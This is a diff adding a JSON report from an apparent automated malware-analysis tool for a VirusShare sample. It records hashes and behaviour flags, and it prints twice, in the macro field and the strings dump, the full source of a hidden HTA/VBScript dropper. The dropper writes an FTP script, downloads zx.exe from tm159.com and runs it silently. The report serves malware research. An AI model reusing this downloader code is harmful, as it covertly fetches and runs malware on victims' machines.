@@ -1,0 +1,70 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Run": "May run an executable file or a system command",
+            "open": "May open a file"
+        },
+        "macro": "<html>\n<HTA:APPLICATION  caption=\"no\" border=\"none\" showInTaskBar=\"no\" windowState=\"minimize\" width=0 height=0>\n<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B' width=0 height=0></object>\n<script language=\"VBScript\">\nDim fs, t, FtpSite, UserName, UserPass, LocalPath, FileName, WinDir, DllFullName \nFtpSite=\"tm159.com\"\nUserName=\"tm159.com\"\nUserPass=\"tm159.com\"\nLocalPath=\"c:\\\"\nSourceFile=\"zx.exe\"\nDestFile=\"zx.exe\"\nSet fs = CreateObject(\"Scripting.FileSystemObject\")\nWinDir = fs.GetSpecialFolder(0)\nDllFullName = WinDir+\"\\Downloaded program files\\ieubtm159.dll\"\nSet t = fs.CreateTextFile(\"zx.txt\",True)\nt.WriteLine(\"open \"&FtpSite)\nt.WriteLine(UserName)\nt.WriteLine(UserPass)\nt.WriteLine(\"bin\")\nt.WriteLine(\"lcd \"&LocalPath)\nt.WriteLine(\"get \"&SourceFile&\" \"&DestFile)\nt.WriteLine(\"bye\")\nt.Close\nif Not fs.FileExists(DllFullName) then\n  wsh.Run \"ftp -s:zx.txt\",0,true\n  if fs.FileExists(LocalPath&DestFile)  then\n    wsh.Run LocalPath&DestFile,0,true\n  end if\nend if\nwindow.close\n</script>\n</html>"
+    },
+    "filename": "VirusShare_2c8025da74791f93c68faf7418e9d684",
+    "filesize": 1049,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2c8025da74791f93c68faf7418e9d684",
+        "sha1": "90bc29031590c9dd688825b4aeaedd9387627b83",
+        "sha256": "46b93af24db1a3e2a9f71d9a7a00d500c24c9c5995b59cffdbfe6a5e091f8155"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html>",
+            "<HTA:APPLICATION  caption=\"no\" border=\"none\" showInTaskBar=\"no\" windowState=\"minimize\" width=0 height=0>",
+            "<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B' width=0 height=0></object>",
+            "<script language=\"VBScript\">",
+            "Dim fs, t, FtpSite, UserName, UserPass, LocalPath, FileName, WinDir, DllFullName ",
+            "FtpSite=\"tm159.com\"",
+            "UserName=\"tm159.com\"",
+            "UserPass=\"tm159.com\"",
+            "LocalPath=\"c:\\\"",
+            "SourceFile=\"zx.exe\"",
+            "DestFile=\"zx.exe\"",
+            "Set fs = CreateObject(\"Scripting.FileSystemObject\")",
+            "WinDir = fs.GetSpecialFolder(0)",
+            "DllFullName = WinDir+\"\\Downloaded program files\\ieubtm159.dll\"",
+            "Set t = fs.CreateTextFile(\"zx.txt\",True)",
+            "t.WriteLine(\"open \"&FtpSite)",
+            "t.WriteLine(UserName)",
+            "t.WriteLine(UserPass)",
+            "t.WriteLine(\"bin\")",
+            "t.WriteLine(\"lcd \"&LocalPath)",
+            "t.WriteLine(\"get \"&SourceFile&\" \"&DestFile)",
+            "t.WriteLine(\"bye\")",
+            "t.Close",
+            "if Not fs.FileExists(DllFullName) then",
+            "  wsh.Run \"ftp -s:zx.txt\",0,true",
+            "  if fs.FileExists(LocalPath&DestFile)  then",
+            "    wsh.Run LocalPath&DestFile,0,true",
+            "  end if",
+            "end if",
+            "window.close",
+            "</script>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.273559",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
